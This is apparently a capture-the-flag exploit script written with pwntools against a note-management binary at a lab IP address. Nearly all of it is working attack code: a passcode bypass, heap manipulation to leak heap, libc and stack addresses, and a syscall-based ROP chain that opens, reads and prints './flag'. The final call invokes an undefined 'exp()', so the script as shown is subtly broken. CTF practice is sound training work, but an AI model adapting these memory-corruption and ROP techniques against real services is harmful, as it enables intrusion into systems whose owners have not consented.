#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = [0x00000000000228e]

def challeng():
    ru("challenge ")
    rnd = int(rl())
    print("rnd: %d" % rnd)
    sla("passcode: ", '01d_6u7_v190r0u5_' + str(rnd + 0x12345678))


def add(index, size, con='a'):
    sla("choice>> ", '1')
    sla("idx:", str(index))
    sla("size:", str(size))
    sla("content:", con)

def show(index):
    sla("choice>> ", '2')
    sla("idx:", str(index))

def  dele(index):
    sla("choice>> ", '4')
    sla("idx:", str(index))

read = 0x645
pop = 0x6ca
ret = 0x6ce
leav = 0x737
puts = 0x6a8

read_note = 0xa4
show_note = 0xb6
new_note  = 0x77
dele_note = 0x86
heap = 0

def rop(payload):
    return flat(0x6ce, payload, pop, 0x6ce, 0x1000, read)

def exp1():
    challeng()
    add(0, 0x32)
    add(1, 0x32)

    sla("choice>> ", '1')
    sla("idx:", str(4))

    payload = flat(1, 2, 3, 4, ret, ret, ret, ret,pop, 0x6ce, 0x100, read)
    sa("size:",payload)

    sl(rop(flat(pop, 0x1000, 0, puts, pop, 0x1520, 0, puts)))
    ru("challenge ")

def exp2():
    heap = u64(re(6,2).ljust(8, b'\x00'))
    print(hex(heap))
    
    def my_show(addr):
        sl(rop(flat(pop, heap, 0x100000020, read_note)))
        payload = flat('a' * 0x30, 0, 0x21, addr, 0x1000)
        sl(payload)
        # sl(rop(flat(pop, addr, 0, show_note)))
        sl(flat(p64(0x6ce)* 8, pop, addr, 0, show_note, pop, 0x6ce , 0x1000, read))

    def my_new(size):
        sl(rop(flat(pop, size, 0, new_note)))
        sl(flat(p64(0x6ce)* 8, pop, 0x6ce , 0x1000, read))

    def my_dele(addr):
        sl(rop(flat(pop, addr, 0, dele_note)))
        sl(flat(p64(0x6ce)* 8, pop, 0x6ce , 0x1000, read))

    my_new(0x500) #  
    target = heap + (0x40 + 0x20 + 0x20) * 2
    print('target:' + hex(target))
    my_dele(target)

    my_new(0x500)
    my_show(target)
    ru('content: ')
    libc_leak = u64(re(6, 2).ljust(8, b'\x00')) 
    print("leak:" + hex(libc_leak))
    LIBC = libc_leak - 0x1ebbe0
    print("libc:" + hex(LIBC))

    libc = ELF("./libc.so.6")
    
    envir =  LIBC + libc.sym['environ']

    
    my_new(0x30)
    # target + 0x510 + 0x20
    target = target + 0x510 + 0x20
    print('target:' + hex(target))

    def my_read(addr, buf):
        sl(rop(flat(pop, addr, 0x100000020, read_note)))
        sl(buf)
        sl(flat(p64(0x6ce)* 8, pop, 0x6ce , 0x1000, read))

    def my_show2(addr):
        sl(rop(flat(pop, addr, 0, show_note)))
        sl(flat(p64(0x6ce)* 8, pop, 0x6ce , 0x1000, read))


    payload = flat('a' * 0x30, 0, 0x21, envir, 0x1000, 0)
    my_read(target, payload)
    my_show2(envir)


    ru('content: ')
    stack_leak = u64(re(6, 2).ljust(8, b'\x00')) 
    print("stack_leak:" + hex(stack_leak))

    stack = stack_leak - 0x168

    my_new(0x30)
    # target + 0x510 + 0x20
    target = target + 0x40 + 0x20
    print('target:' + hex(target))

    payload = flat('a' * 0x10, './flag\x00').ljust(0x30, b'a')
    payload += flat(0, 0x21, stack, 0x10000)
    my_read(target, payload)


    filename = target + 0x10
    print('filename:' + hex(filename))


    poprdi  = 0x0000000000026b72 + LIBC
    poprsi  = 0x0000000000027529 + LIBC 
    poprdx2 = 0x000000000011c371 + LIBC
    syscall = 0x0000000000066229 + LIBC 
    poprax  = 0x000000000004a550 + LIBC

    payload = flat('a' * 0x10, target, 'b' * 0x10, 
            # open (flag)
            poprdi, filename, 
            poprsi, 0, 
            poprdx2, 0, 0, 
            poprax, 2, 
            syscall, 
            # read(3, buf, 0x200)
            poprdi, 3, 
            poprsi, target, 
            poprdx2, 0x200, 0, 
            poprax, 0, 
            syscall, 
            # write(1, buf, 0x200)
            poprdi, 1, 
            poprsi, target, 
            poprdx2, 0x200, 0, 
            poprax, 1,
            syscall, 
            )

    sl(rop(flat(pop, stack, 0x100000020, read_note)))
    sl(payload)












context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./bin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("172.20.5.31", 11404)

elf = ELF('./bin')

def gdba():
    if local == 0:
        return 0;
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base =int(os.popen("pmap {}|grep bin |awk '{{print $1}}'".format(cn.pid)).readlines()[1],16)
        cmd +=''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd +='set $base={:#x}\n'.format(base)
        cmd +='set $vip=$rebase(0x00000000000070B0)\n'
        cmd +='set $stack=$rebase(0x0000000000007018)\n'
        slog['base'] = base	
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
    gdb.attach(cn,cmd)

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;
from pwnlib.util import cyclic
ff  = lambda arg, f=cyclic.de_bruijn(), l=None :flat(*arg, filler=f, length=l)

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

'''
while 1:
    try:
        #cn = process('./bin')
        cn = remote("172.20.5.31", 11404)
        exp1()
        break
    except:
        try:
            cn.close()
        except:
            continue
        
'''
exp()

slog_show()

ia()

